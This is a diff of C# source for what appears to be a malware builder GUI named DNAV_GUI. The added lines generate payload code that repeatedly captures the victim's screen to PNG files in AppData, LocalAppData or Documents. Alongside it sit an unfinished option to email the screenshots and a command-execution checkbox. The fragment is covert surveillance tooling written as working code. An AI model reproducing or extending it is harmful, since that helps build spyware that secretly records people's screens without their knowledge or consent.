@@ -1297,7 +1297,29 @@ namespace DNAV_GUI
 
             if (screenshotCheckbox.IsChecked == true)
             {
-                code += @"";
+                if(screenshotLocalCheckbox.IsChecked == true)
+                {
+                    code += @"ScreenCapture sc = new ScreenCapture();
+                Thread screenshot = new Thread(() => sc.CaptureScreenToFile(";
+                    switch (screenshotLocalCombobox.SelectedIndex)
+                    {
+                        case 0:
+                            code += "Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)";
+                            break;
+                        case 1:
+                            code += "Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)";
+                            break;
+                        case 2:
+                            code += "Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)";
+                            break;
+                    }
+                    code += @", System.Drawing.Imaging.ImageFormat.Png, 60));
+                screenshot.Start();";
+                }
+                if(screenshotEmailCheckbox.IsChecked == true)
+                {
+                    code += @"";
+                }
             }
 
             if (cmdCheckbox.IsChecked == true)
